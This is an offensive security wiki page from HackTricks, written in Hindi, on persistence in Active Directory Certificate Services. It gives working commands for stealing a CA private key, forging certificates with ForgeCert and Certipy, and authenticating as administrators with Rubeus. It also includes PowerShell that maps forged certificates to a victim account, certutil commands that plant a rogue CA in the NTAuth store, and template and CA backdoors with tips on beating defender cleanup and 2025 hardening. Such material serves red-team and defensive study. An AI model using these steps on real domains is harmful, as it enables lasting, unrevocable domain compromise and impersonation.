# AD CS डोमेन परसिस्टेंस

{{#include ../../../banners/hacktricks-training.md}}

**यह उन डोमेन परसिस्टेंस तकनीकों का सारांश है जो [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) में साझा की गई हैं। आगे के विवरण के लिए इसे देखें।**

## Forging Certificates with Stolen CA Certificates - DPERSIST1

आप कैसे बता सकते हैं कि कोई प्रमाणपत्र CA प्रमाणपत्र है?

यह निर्धारित किया जा सकता है कि कोई प्रमाणपत्र CA प्रमाणपत्र है यदि कई शर्तें पूरी होती हैं:

- प्रमाणपत्र CA सर्वर पर संग्रहीत होता है, और इसकी private key मशीन के DPAPI द्वारा सुरक्षित होती है, या ऑपरेटिंग सिस्टम के समर्थन होने पर TPM/HSM जैसे हार्डवेयर द्वारा सुरक्षित होती है।
- प्रमाणपत्र के Issuer और Subject फ़ील्ड दोनों CA के distinguished name से मेल खाते हैं।
- "CA Version" extension केवल CA प्रमाणपत्रों में मौजूद होता है।
- प्रमाणपत्र में Extended Key Usage (EKU) फ़ील्ड्स नहीं होते हैं।

इस प्रमाणपत्र की private key निकालने के लिए CA सर्वर पर `certsrv.msc` टूल बिल्ट-इन GUI के माध्यम से समर्थित विधि है। फिर भी, यह प्रमाणपत्र सिस्टम में संग्रहीत अन्य प्रमाणपत्रों से अलग नहीं है; इसलिए, [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) जैसे तरीकों को extraction के लिए लागू किया जा सकता है।

प्रमाणपत्र और private key को Certipy का उपयोग करके निम्नलिखित कमांड से भी प्राप्त किया जा सकता है:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
जब `.pfx` फ़ॉर्मेट में CA प्रमाणपत्र और उसकी private key प्राप्त हो जाए, तो [ForgeCert](https://github.com/GhostPack/ForgeCert) जैसे टूल्स मान्य प्रमाणपत्र बनाने के लिए उपयोग किए जा सकते हैं:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> प्रमाणपत्र फोर्जरी का लक्ष्य बनने वाला user Active Directory में सक्रिय और प्रमाणीकृत होने में सक्षम होना चाहिए ताकि यह प्रक्रिया सफल हो सके। krbtgt जैसे विशेष खातों के लिए certificate फोर्ज करना प्रभावी नहीं है।

यह forged certificate निर्दिष्ट समाप्ति तिथि तक और तब तक **valid** रहेगा जब तक root CA certificate वैध है (आमतौर पर 5 से **10+ वर्षों**)। यह मशीनों के लिए भी **valid** होता है, इसलिए **S4U2Self** के साथ मिलाकर एक attacker उस CA certificate की वैधता तक किसी भी domain machine पर **persistence बनाए रख सकता है**.\
इसके अलावा, इस विधि से बनाए गए **certificates generated** को **revoke** नहीं किया जा सकता क्योंकि CA उनके बारे में अवगत नहीं है।

### Operating under Strong Certificate Mapping Enforcement (2025+)

11 February, 2025 से (KB5014754 rollout के बाद), domain controllers certificate mappings के लिए डिफ़ॉल्ट रूप से **Full Enforcement** पर हैं। व्यवहार में इसका मतलब है कि आपकी forged certificates में या तो:

- लक्षित account के साथ एक मजबूत बाइंडिंग हो (उदाहरण के लिए, SID security extension), या
- लक्ष्य object के `altSecurityIdentities` attribute पर एक मजबूत, स्पष्ट mapping के साथ पेयर किए गए हों।

पर्सिस्टेंस के लिए एक भरोसेमंद तरीका है कि चोरी किए गए Enterprise CA से chained एक forged certificate mint किया जाए और फिर victim principal पर एक मजबूत स्पष्ट mapping जोड़ी जाए:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- यदि आप ऐसे forged certificates बना सकते हैं जिनमें `SID security extension` शामिल हो, तो वे Full Enforcement के अंतर्गत भी implicitly map हो जाएँगे। अन्यथा, explicit strong mappings को प्राथमिकता दें। अधिक जानकारी के लिए देखें [account-persistence](account-persistence.md)।
- Revocation यहाँ defenders की मदद नहीं करता: forged certificates CA database के लिए अज्ञात होते हैं और इसलिए उन्हें revoked नहीं किया जा सकता।

## Trusting Rogue CA Certificates - DPERSIST2

`NTAuthCertificates` object को परिभाषित किया गया है ताकि इसकी `cacertificate` attribute में एक या अधिक **CA certificates** रखे जाएँ, जिन्हें Active Directory (AD) उपयोग करता है। **domain controller** द्वारा verification प्रक्रिया यह जाँचती है कि `NTAuthCertificates` object में कोई entry है जो authenticating **certificate** के Issuer field में निर्दिष्ट **CA** से मेल खाती हो। यदि मेल मिलता है तो authentication आगे बढ़ती है।

एक attacker, यदि उनके पास इस AD object का control है, तो self-signed CA certificate को `NTAuthCertificates` object में जोड़ सकता है। सामान्यतः केवल **Enterprise Admin** group के सदस्य, साथ ही **Domain Admins** या **Administrators** जो **forest root’s domain** में हैं, को इस object को modify करने की अनुमति दी जाती है। वे `certutil.exe` का उपयोग करके `NTAuthCertificates` object को edit कर सकते हैं, कमांड `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` के साथ, या [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) का उपयोग करके।

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
यह क्षमता विशेष रूप से तब प्रासंगिक है जब इसे पहले वर्णित विधि के साथ मिलाकर उपयोग किया जाए जिसमें ForgeCert का उपयोग करके डायनेमिक रूप से certificates जनरेट किए जाते हैं।

> Post-2025 के मैपिंग संबंधी विचार: NTAuth में एक rogue CA रखने से केवल जारी करने वाली CA में भरोसा स्थापित होता है। जब DCs **Full Enforcement** में हों और leaf certificates का उपयोग logon के लिए करना हो, तो leaf में या तो SID security extension होना चाहिए या target object पर एक मजबूत explicit mapping होना चाहिए (उदाहरण के लिए, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

AD CS कंपोनेंट्स के security descriptor संशोधनों के माध्यम से **persistence** के अवसर प्रचुर हैं। "[Domain Escalation](domain-escalation.md)" सेक्शन में वर्णित संशोधनों को elevated access वाले attacker द्वारा दुर्भावनापूर्ण रूप से लागू किया जा सकता है। इसमें संवेदनशील घटकों में "control rights" (उदा., WriteOwner/WriteDACL/etc.) जोड़ना शामिल है, जैसे:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

एक दुर्भावनापूर्ण कार्यान्वयन के उदाहरण में वह attacker शामिल होगा जिसे डोमेन में **elevated permissions** प्राप्त हैं, जो default **`User`** certificate template में **`WriteOwner`** permission जोड़ देगा, और attacker उस अधिकार का principal होगा। इसे भुनाने के लिए, attacker पहले **`User`** template का ownership अपने नाम कर लेगा। उसके बाद, template पर **`mspki-certificate-name-flag`** को **1** पर सेट किया जाएगा ताकि **`ENROLLEE_SUPPLIES_SUBJECT`** सक्षम हो, जिससे अनुरोध में Subject Alternative Name प्रदान करने की अनुमति मिलती है। इसके पश्चात्, attacker उस **template** का उपयोग करके **enroll** कर सकता है, alternative name के रूप में एक **domain administrator** नाम चुनकर, और प्राप्त सर्टिफिकेट का उपयोग DA के रूप में authentication के लिए कर सकता है।

लंबी अवधि के domain persistence के लिए attackers द्वारा सेट किए जा सकने वाले व्यावहारिक विकल्प (पूर्ण विवरण और detection के लिए देखें {{#ref}}domain-escalation.md{{#endref}}):

- CA policy flags जो requesters से SAN की अनुमति देते हैं (उदा., `EDITF_ATTRIBUTESUBJECTALTNAME2` सक्षम करना)। यह ESC1-जैसी paths को exploitable बनाए रखता है।
- Template DACL या सेटिंग्स जो authentication-capable issuance की अनुमति देती हैं (उदा., Client Authentication EKU जोड़ना, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम करना)।
- `NTAuthCertificates` object या CA containers को नियंत्रित करना ताकि defenders द्वारा cleanup का प्रयास करने पर rogue issuers को लगातार फिर से introduce किया जा सके।

> [!TIP]
> KB5014754 के बाद hardened environments में, इन misconfigurations को explicit strong mappings (`altSecurityIdentities`) के साथ जोड़ने से यह सुनिश्चित होता है कि आपके जारी किए गए या forged certificates उपयोग योग्य बने रहें यहाँ तक कि जब DCs strong mapping लागू करते हैं।


## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
